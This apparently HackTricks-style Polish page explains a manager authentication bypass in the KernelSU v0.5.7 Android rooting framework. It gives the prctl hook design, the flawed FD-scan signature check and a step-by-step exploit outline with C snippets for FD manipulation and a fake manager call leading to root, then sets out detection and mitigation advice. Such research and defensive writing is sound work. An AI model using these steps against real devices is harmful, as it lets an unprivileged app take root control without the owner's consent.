# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

Rooting frameworks, takie jak KernelSU, APatch i SKRoot, patchują lub hookują kernel Androida/Linuxa i udostępniają uprzywilejowane funkcje nieuprzywilejowanej aplikacji managera w userspace. Magisk został omówiony osobno poniżej, ponieważ CVE-2024-48336 dotyczył ładowania kodu po stronie managera, a nie tej ścieżki syscall KernelSU.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Ta strona przedstawia w sposób abstrakcyjny techniki i problemy wykryte w publicznych badaniach (w szczególności analizie KernelSU v0.5.7 przeprowadzonej przez Zimperium), aby pomóc zespołom red i blue zrozumieć powierzchnie ataku, primitives exploitu oraz skuteczne mechanizmy mitigacji.<sup>[[1]](#references)</sup>

---
## Wzorzec architektury: kanał managera z hookowanym syscall

- W KernelSU v0.5.7 hook kernela na `prctl` odbiera magiczną wartość, identyfikator polecenia oraz argumenty specyficzne dla polecenia z userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Wywołujący najpierw żąda statusu managera za pomocą `CMD_BECOME_MANAGER`. Autoryzacja zależy od polecenia: `CMD_GRANT_ROOT` sprawdza stan managera/allowlisty, `CMD_ALLOW_SU` jest dostępne wyłącznie dla managera, a `CMD_SET_SEPOLICY` w tej wersji jest dostępne wyłącznie dla roota.<sup>[[2]](#references)[[11]](#references)</sup>
- Pozostałe polecenia odczytują wersję/konfigurację lub zgłaszają zdarzenia frameworka.<sup>[[2]](#references)</sup>
- Ponieważ każda aplikacja może wywołać ten interfejs syscall, poprawność uwierzytelniania managera ma kluczowe znaczenie.<sup>[[1]](#references)[[2]](#references)</sup>

Przykład (design KernelSU):
- Hookowany syscall: prctl
- Magiczna wartość przekierowująca do handlera KernelSU: 0xDEADBEEF
- Polecenia obejmują: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT itd.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## Przepływ uwierzytelniania KernelSU v0.5.7 (zgodnie z implementacją)

Gdy userspace wywołuje prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU weryfikuje:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Sprawdzenie prefiksu ścieżki
- Podana ścieżka musi zaczynać się od oczekiwanego prefiksu dla UID wywołującego, np. /data/data/<pkg> lub /data/user/<id>/<pkg>.
- Odniesienie: logika sprawdzania prefiksu ścieżki w core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Sprawdzenie własności
- Właścicielem ścieżki musi być UID wywołującego.
- Odniesienie: logika sprawdzania własności w core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) Sprawdzenie sygnatury APK za pomocą skanowania tablicy FD
- Iteruj po otwartych deskryptorach plików procesu wywołującego w rosnącej kolejności deskryptorów.
- Dla każdego zwykłego pliku, którego ścieżka zaczyna się od `/data/app/` i kończy na `/base.apk`, wymagaj, aby ścieżka zawierała substring pakietu wyprowadzony z podanej ścieżki katalogu danych.
- Zweryfikuj sygnaturę pierwszego kandydata spełniającego te sprawdzenia ścieżki.
- Przeanalizuj sygnaturę APK v2 i zweryfikuj ją względem oficjalnego certyfikatu managera.
- Odniesienia: manager.c (iterowanie po FD), apk_sign.c (weryfikacja APK v2).<sup>[[3]](#references)[[4]](#references)</sup>

Jeśli wszystkie sprawdzenia zakończą się powodzeniem, kernel tymczasowo zapisuje UID managera w cache; polecenia dostępne wyłącznie dla managera akceptują następnie ten UID, podczas gdy pozostałe polecenia nadal zachowują własne sprawdzenia UID lub allowlisty.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Klasa podatności: zaufanie do wyboru APK na podstawie ścieżki

KernelSU v0.5.7 nie wiąże wyniku weryfikacji sygnatury z tożsamością zainstalowanego pakietu ustaloną przez PackageManager. W `manager.c` sprawdzenie pakietu jest wyłącznie sprawdzeniem substringu ścieżki (`strstr(cwd, pkg)`); następnie weryfikowany jest podpis pierwszego kandydata spełniającego te sprawdzenia. Atakujący może więc umieścić oryginalny manager APK pod ścieżką `/data/app/`, która zawiera również nazwę pakietu atakującego, i doprowadzić do wybrania tego pliku jako pierwszego.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

To zaufanie oparte na pośrednim sprawdzeniu pozwala nieuprzywilejowanej aplikacji podszyć się pod managera bez posiadania klucza podpisywania managera.<sup>[[1]](#references)</sup>

Wykorzystywane właściwości:<sup>[[1]](#references)[[3]](#references)</sup>
- Skanowanie FD odbywa się według indeksu deskryptora, a sprawdzenie pakietu jest testem substringu ścieżki, a nie zweryfikowanym powiązaniem tożsamości pakietu z APK.
- open() zwraca najniższy dostępny FD. Zamykając najpierw deskryptory o niższych numerach, atakujący może kontrolować kolejność.
- Dołączony manager APK można umieścić pod `/data/app/` w ścieżce zawierającej string pakietu atakującego, zachowując jednocześnie oficjalną sygnaturę managera.

---
## Warunki wstępne ataku

Konkretny przypadek KernelSU v0.5.7 wymaga:<sup>[[1]](#references)[[3]](#references)</sup>

- Urządzenie jest już zrootowane za pomocą podatnego rooting frameworka (np. KernelSU v0.5.7).
- Atakujący może lokalnie uruchamiać dowolny nieuprzywilejowany kod (proces aplikacji Android).
- W implementacji v0.5.7 `current->real_parent` musi mieć UID 0 (komentarz w kodzie opisuje to jako wymaganie bezpośredniego dziecka zygote); `manager.c` odrzuca inne procesy nadrzędne.<sup>[[3]](#references)</sup>
- Prawdziwy manager nie został jeszcze uwierzytelniony (np. bezpośrednio po restarcie). Niektóre frameworki zapisują UID managera w cache po pomyślnym uwierzytelnieniu; trzeba wygrać race condition.<sup>[[1]](#references)</sup>

---
## Zarys exploitu (KernelSU v0.5.7)

Kroki wysokiego poziomu (cytowane demo video pokazuje działający publiczny proof of concept):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Zbuduj prawidłową ścieżkę do własnego katalogu danych aplikacji, aby spełnić sprawdzenia prefiksu i własności.
2) Umieść oryginalny KernelSU Manager base.apk pod `/data/app/` w ścieżce zawierającej string twojego pakietu, a następnie otwórz go na FD o niższym numerze niż FD własnego base.apk.
3) Wywołaj prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...), aby przejść sprawdzenia.
4) Użyj `CMD_GRANT_ROOT`, a następnie `CMD_ALLOW_SU` w celu uzyskania trwałego su; wywołuj dostępne wyłącznie dla roota `CMD_SET_SEPOLICY` dopiero po uzyskaniu roota i tylko tam, gdzie jest obsługiwane.

Uwagi praktyczne dotyczące kroku 2 (kolejność FD):<sup>[[1]](#references)</sup>
- Zidentyfikuj FD procesu wskazujący na własny /data/app/*/base.apk, przechodząc po symlinkach /proc/self/fd.
- Zamknij FD o niskim numerze (np. stdin, fd 0) i najpierw otwórz prawidłowy manager APK, aby zajął fd 0 (lub dowolny indeks niższy niż FD własnego base.apk).
- Dołącz oryginalny manager APK do aplikacji, tak aby jego ścieżka zaczynała się od `/data/app/`, kończyła na `/base.apk` i zawierała string twojego pakietu. Na przykład ścieżka w katalogu `lib` aplikacji może spełniać te sprawdzenia.<sup>[[1]](#references)[[3]](#references)</sup>

Przykładowe fragmenty kodu (Android/Linux, wyłącznie ilustracyjne):

Wyliczanie otwartych FD w celu znalezienia wpisów base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Wymuś, aby deskryptor FD o niższym numerze wskazywał na oryginalny plik APK managera:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Uwierzytelnianie Managera za pośrednictwem hooka `prctl` w KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Po pomyślnym wykonaniu, uprzywilejowane commands (przykłady):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: promuje bieżący proces do root
- CMD_ALLOW_SU: dodaje Twój package/UID do allowlist dla trwałego su
- CMD_SET_SEPOLICY: dostosowuje politykę SELinux po uzyskaniu root; KernelSU v0.5.7 sprawdza UID 0 dla tego command.<sup>[[2]](#references)</sup>

Wskazówka dotycząca race/persistence:
- Zarejestruj receiver BOOT_COMPLETED w AndroidManifest (`RECEIVE_BOOT_COMPLETED`), aby uruchamiać się po reboot i podejmować próbę authentication przed właściwym managerem; permission autoryzuje odbiór `ACTION_BOOT_COMPLETED`, ale sama nie gwarantuje priorytetu scheduling.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Wskazówki dotyczące wykrywania i mitigation

Dla developerów frameworków:
- Powiąż authentication z package/UID caller, a nie z arbitralnymi FD:
- Ustal package caller na podstawie jego UID i zweryfikuj go względem signature zainstalowanego package (przez PackageManager), zamiast skanować FD.
- Jeśli rozwiązanie jest kernel-only, użyj stabilnej identity caller (task creds) i przeprowadzaj validation względem stabilnego źródła prawdy zarządzanego przez init/userspace helper, a nie względem FD procesu.
- Unikaj sprawdzania prefiksu path jako identity; caller może je w trywialny sposób spełnić.
- Użyj challenge–response opartego na nonce przez channel oraz wyczyść każdą cached identity managera podczas boot lub po kluczowych eventach.
- Rozważ authenticated IPC oparte na binderze zamiast przeciążania generic syscalls, jeśli jest to wykonalne.

Dla defenderów/blue team:
- Wykrywaj obecność rooting frameworks i procesów managerów; monitoruj calls prctl z podejrzanymi magic constants (np. 0xDEADBEEF), jeśli masz telemetry z kernela.<sup>[[1]](#references)[[11]](#references)</sup>
- W zarządzanych flotach blokuj lub generuj alerty dotyczące boot receivers z niezaufanych packages, które szybko próbują wykonywać privileged manager commands po boot.
- Upewnij się, że urządzenia są zaktualizowane do patched versions frameworka; unieważniaj cached manager IDs podczas update.

Ograniczenia attack:<sup>[[1]](#references)[[2]](#references)</sup>
- Dotyczy wyłącznie urządzeń, które już mają root za pomocą vulnerable frameworka.
- Zwykle wymaga reboot/race window przed authentication legalnego managera (niektóre frameworki cache'ują UID managera do momentu reset).

---
## Powiązane uwagi dotyczące różnych frameworków

- Authentication oparte na password (np. historyczne buildy APatch/SKRoot) może być słabe, jeśli passwords można zgadnąć lub poddać bruteforce albo jeśli validations zawierają błędy.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Authentication oparte na package/signature (np. KernelSU) jest z założenia silniejsze, ale musi wiązać się z rzeczywistym callerem, a nie z artefacts wyprowadzonymi z path i wybranymi przez skanowanie FD.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 dotyczyło buildów wcześniejszych niż Canary 27007, które ładowały code z niezweryfikowanego package GMS, umożliwiając lokalnej aplikacji wykonanie code w aplikacji Magisk i eskalację do root bez interakcji użytkownika.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Rootowanie wszystkiego, co złe: luki bezpieczeństwa, które mogłyby zagrozić Twojemu urządzeniu mobilnemu](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – checks authentication w core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – iteracja FD, sprawdzanie package i wywołanie signature w manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – weryfikacja APK v2 w apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Projekt KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Problem Magisk #8279 – weryfikacja, czy GMS jest system app](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Film demonstracyjny PoC KSU (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – identifiers commands w ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
